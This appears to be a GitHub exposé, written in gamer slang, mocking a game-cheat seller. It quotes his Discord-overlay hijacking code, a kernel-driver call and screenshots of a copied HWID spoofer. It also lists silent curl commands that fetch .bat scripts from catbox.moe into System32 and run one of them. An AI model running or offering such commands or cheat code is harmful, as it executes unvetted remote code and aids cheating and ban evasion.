### well not much to say here he clowned on my friend (drexxy) and is using sofmain driver
- his "private" cheat uses netconnections as showcased by drexxy in his repo [(zens original exposing <3)](https://github.com/Drexxyyy/exposing-skids-pt2)
- the reversed binary of his temp spoofer is included above (open in ida) aswell as the original
### proof of chatgpt
<img width="1920" height="1080" alt="sd" src="https://github.com/user-attachments/assets/16917c29-8abe-4c6e-98c3-8351a835bb02" />

```cpp
// this is a direct snippet he posted in his server proving it "wasn't pasted"
static inline bool DiscordHook(HWND& hwnd_out) { // DiscordHook is NOT human naming
    HWND hwnd = nullptr;

    while ((hwnd = FindWindowExA(nullptr, hwnd, "Chrome_WidgetWin_1", nullptr)) != nullptr) {
        DWORD pid = 0;
        GetWindowThreadProcessId(hwnd, &pid);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid); // open process = dtc yet he claims fud?
        if (hProcess) {                                           // he also clearly doesn't understand what the `PROCESS_VM_READ` does as he doesn't read any virtual memory here? just searches the processes </3
            char exePath[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, nullptr, exePath, MAX_PATH)) {
                std::string path = exePath;
                if (path.find("Discord") != std::string::npos) {
                    // why not just return this? or have a global handle? ai doesn't think of these things but a human would (with any programming knowledge)
                    hwnd_out = hwnd;
                    CloseHandle(hProcess);
                    return true;
                }
            }
            CloseHandle(hProcess);
        }
    }
    return false;
}

void OverlayRender()
{
    HWND hwndout = nullptr;
    if (!DiscordHook(hwndout)) {
        MessageBoxA(0, "Couldn't find Discord overlay window.", "Error", MB_ICONERROR);
        return;
    }
    MARGINS margin = { -1 };
    DwmExtendFrameIntoClientArea(hwndout, &margin);
    SetWindowLong(hwndout, GWL_EXSTYLE, GetWindowLong(hwndout, GWL_EXSTYLE) | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW);
    SetLayeredWindowAttributes(hwndout, RGB(0, 0, 0), 255, LWA_ALPHA);
    ShowWindow(hwndout, SW_SHOW);
    UpdateWindow(hwndout);
    MyWnd = hwndout; // i dont even wanna comment on this its so aids </3
}
```


### proof of sofmain driver
```cpp
// in his free cheat, but still dont use sofmain.
// he also didn't bother to remove the sofmain credits in his imgui build XD
hDevice = CreateFileW(L"\\\\.\\sofmainud1337", 0xC0000000, 3u, 0i64, 3u, 0, 0i64);
```
![zen](https://github.com/user-attachments/assets/f2eb736b-2eb5-4a5a-9899-daf555c7f7c5)

### the spoofer he skidded from github </3
- https://github.com/Flxziee55/temp-spoofer-src/tree/529a099eb2c27ec36a8d0e08ba6b0f7050e0c704
- proof:
<img width="1219" height="660" alt="NTSTATUS st = ntNtUnloadDriver( serviceStr);" src="https://github.com/user-attachments/assets/0279e524-e224-44e2-8a8a-a12579b8dc35" />


as you see it shows as `GetProcessAddress(... "NtUnloadDriver");` just like the code runs.


<img width="1219" height="660" alt="Untitled design" src="https://github.com/user-attachments/assets/361a1ed2-0810-43a4-aaab-feb786456580" />


<img width="1219" height="660" alt="Untitled design(1)" src="https://github.com/user-attachments/assets/2d9c5237-1b9b-421c-afd5-e6f9c26c98bb" />

<img width="1219" height="660" alt="NTSTATUS st = ntNtUnloadDriver( serviceStr);(1)" src="https://github.com/user-attachments/assets/f65c0bbc-c575-4eb8-b986-120500951cd7" />

- heres his checker if u want it and what he calls a cleaner.
- curl --silent https://files.catbox.moe/kis4ge.bat --output C:\\Windows\\System32\\check.bat >nul 2>&1
- cd C:\\Windows\\System32\\ && clean.bat
- curl --silent https://files.catbox.moe/ykmoac.bat --output C:\\Windows\\System32\\clean.bat >nul 2>&1


### doesn't understand basic c++ concepts
<img width="1219" height="660" alt="uintptr_t pos_ptr = readuintptr_t(player_base + offsetspos); float x = readfloat(pos_ptr + 0x0); float y = readfloat(pos_ptr + 0x4); float z = readfloat(pos_ptr + 0x8);" src="https://github.com/user-attachments/assets/dfaf063e-2fdf-4c8a-8bc5-c89aefce2299" />

